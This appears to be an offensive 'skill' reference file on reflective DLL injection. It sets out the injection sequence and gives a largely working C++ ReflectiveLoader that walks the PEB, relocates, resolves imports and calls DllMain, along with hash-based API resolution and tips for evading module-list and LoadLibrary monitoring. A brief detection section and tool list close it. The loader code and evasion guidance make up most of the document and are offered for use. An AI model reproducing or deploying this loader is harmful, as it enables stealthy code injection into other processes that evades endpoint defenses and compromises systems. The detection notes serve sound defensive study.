---
name: reflective-dll-injection
description: Reflective DLL injection -- PE that maps itself into memory without LoadLibrary by walking PEB for API resolution, manually relocating, resolving imports, and calling DllMain. No file on disk.
metadata:
  type: offensive
---

# Reflective DLL Injection

A DLL that contains its own loader and can map itself into a process's address space without
calling `LoadLibrary`. The entire PE lives in memory -- never touches disk, never appears in
the module list, and bypasses DLL load monitoring hooks.

## How It Works

### Standard DLL Injection (for contrast)

```
1. VirtualAllocEx in target process
2. WriteProcessMemory -- write DLL PATH string
3. CreateRemoteThread(LoadLibraryA, path)
4. Windows loader maps the DLL, resolves imports, calls DllMain
```

This appears in the module list, triggers `LdrLoadDll` hooks, and requires the DLL on disk.

### Reflective Injection

```
1. VirtualAllocEx in target process (RWX)
2. WriteProcessMemory -- write the ENTIRE DLL BINARY (not a path)
3. CreateRemoteThread(ReflectiveLoader export, 0)
4. ReflectiveLoader (inside the DLL) does the work the OS loader would:
   a. Find its own base address in memory
   b. Walk PEB → InMemoryOrderModuleList to find kernel32/ntdll
   c. Resolve GetProcAddress, LoadLibraryA, VirtualAlloc, etc.
   d. Allocate new memory, copy PE headers + sections at proper alignment
   e. Process relocations (IMAGE_BASE_RELOCATION)
   f. Resolve imports (IMAGE_IMPORT_DESCRIPTOR)
   g. Set section protections (VirtualProtect per section)
   h. Call DllMain(DLL_PROCESS_ATTACH)
```

## ReflectiveLoader Implementation Skeleton

```cpp
// This function is exported by the DLL and is the entry point for the remote thread.
// It runs inside the target process with the raw DLL bytes already written at some address.

__declspec(dllexport) ULONG_PTR ReflectiveLoader(LPVOID lpParameter) {
    // 1. Find our own base: scan backwards from current EIP/RIP for MZ header
    ULONG_PTR base = (ULONG_PTR)ReflectiveLoader;
    while (((PIMAGE_DOS_HEADER)base)->e_magic != IMAGE_DOS_SIGNATURE)
        base--;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);

    // 2. Walk PEB to find kernel32.dll
    //    PEB → Ldr → InMemoryOrderModuleList
    //    Second entry = ntdll, third = kernel32 (typical)
    PPEB peb;
#ifdef _WIN64
    peb = (PPEB)__readgsqword(0x60);
#else
    peb = (PPEB)__readfsdword(0x30);
#endif

    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink;  // first module (exe)
    // Walk until we find kernel32.dll by hash or name comparison
    HMODULE hKernel32 = find_module_by_hash(entry, KERNEL32_HASH);

    // 3. Resolve critical APIs from kernel32
    auto pGetProcAddress = (GetProcAddress_t)find_export(hKernel32, GETPROCADDRESS_HASH);
    auto pLoadLibraryA   = (LoadLibraryA_t)pGetProcAddress(hKernel32, "LoadLibraryA");
    auto pVirtualAlloc   = (VirtualAlloc_t)pGetProcAddress(hKernel32, "VirtualAlloc");
    auto pVirtualProtect = (VirtualProtect_t)pGetProcAddress(hKernel32, "VirtualProtect");

    // 4. Allocate memory at preferred base (or anywhere)
    ULONG_PTR newBase = (ULONG_PTR)pVirtualAlloc(
        (LPVOID)nt->OptionalHeader.ImageBase,
        nt->OptionalHeader.SizeOfImage,
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!newBase)
        newBase = (ULONG_PTR)pVirtualAlloc(NULL,
            nt->OptionalHeader.SizeOfImage,
            MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    // 5. Copy headers
    memcpy_local((void*)newBase, (void*)base, nt->OptionalHeader.SizeOfHeaders);

    // 6. Copy sections
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        memcpy_local((void*)(newBase + sec[i].VirtualAddress),
                     (void*)(base + sec[i].PointerToRawData),
                     sec[i].SizeOfRawData);
    }

    // 7. Process relocations
    ULONG_PTR delta = newBase - nt->OptionalHeader.ImageBase;
    if (delta) {
        auto reloc = (PIMAGE_BASE_RELOCATION)(newBase +
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        process_relocations(reloc, delta);
    }

    // 8. Resolve imports
    auto importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(newBase +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    while (importDesc->Name) {
        HMODULE hMod = pLoadLibraryA((LPCSTR)(newBase + importDesc->Name));
        auto oft = (PIMAGE_THUNK_DATA)(newBase + importDesc->OriginalFirstThunk);
        auto ft  = (PIMAGE_THUNK_DATA)(newBase + importDesc->FirstThunk);
        while (oft->u1.AddressOfData) {
            auto fn = (PIMAGE_IMPORT_BY_NAME)(newBase + oft->u1.AddressOfData);
            ft->u1.Function = (ULONG_PTR)pGetProcAddress(hMod, fn->Name);
            ++oft; ++ft;
        }
        importDesc++;
    }

    // 9. Set section protections
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        DWORD prot = section_to_protect(sec[i].Characteristics);
        DWORD old;
        pVirtualProtect((LPVOID)(newBase + sec[i].VirtualAddress),
                        sec[i].Misc.VirtualSize, prot, &old);
    }

    // 10. Call DllMain
    auto DllMain = (DllMain_t)(newBase + nt->OptionalHeader.AddressOfEntryPoint);
    DllMain((HINSTANCE)newBase, DLL_PROCESS_ATTACH, NULL);

    return newBase;
}
```

## Key Implementation Details

### Module Hash Resolution

Instead of string comparison (which leaves cleartext module names), hash the module name:

```cpp
uint32_t hash_module(const wchar_t* name) {
    uint32_t h = 0;
    while (*name) {
        h = (h >> 13) | (h << 19);     // ror 13
        h += (*name >= L'a') ? (*name - 0x20) : *name;  // to upper
        name++;
    }
    return h;
}
```

### Position-Independent Code

The ReflectiveLoader must be entirely position-independent:
- No global variables (or use RIP-relative addressing)
- No CRT functions (implement `memcpy_local` inline)
- No imported functions until after PEB walk resolves them
- Compile with `/GS-` (no stack cookies -- they reference `__security_cookie` global)

### sRDI (Shellcode Reflective DLL Injection)

sRDI converts any DLL into position-independent shellcode by prepending a bootstrap stub
that calls the ReflectiveLoader. The output is a single blob that can be injected into any
process without needing to know the DLL's internal structure.

## Detection

- `MEM_PRIVATE | PAGE_EXECUTE_READWRITE` regions containing PE headers (MZ signature)
- Thread start addresses not backed by any loaded module
- PE sections in non-image memory (IMAGE_SECTION_HEADER patterns in `MEM_PRIVATE`)
- ETW `Microsoft-Windows-Kernel-Process` events missing for the injected module
  (no `ImageLoaded` event because `LoadLibrary` was never called)
- Scan `MEM_PRIVATE` executable regions for known export names or PE structures

## Tools

- **Stephen Fewer's ReflectiveDLLInjection** -- the original reference implementation
- **sRDI** -- shellcode RDI converter
- **Donut** -- converts any .NET assembly, PE, or shellcode into position-independent shellcode
  (uses a similar technique)
- **pe_to_shellcode** -- hasherezade's PE-to-shellcode converter

## Related Skills

- `lazy-importer-peb-walk` -- PEB-based API resolution used by ReflectiveLoader
- `pe-injection-remote` -- the injection vector that delivers the reflective DLL
- `windows-process-injection-memory` -- umbrella injection reference
- `hidden-process-detection` -- detecting the injected code at runtime
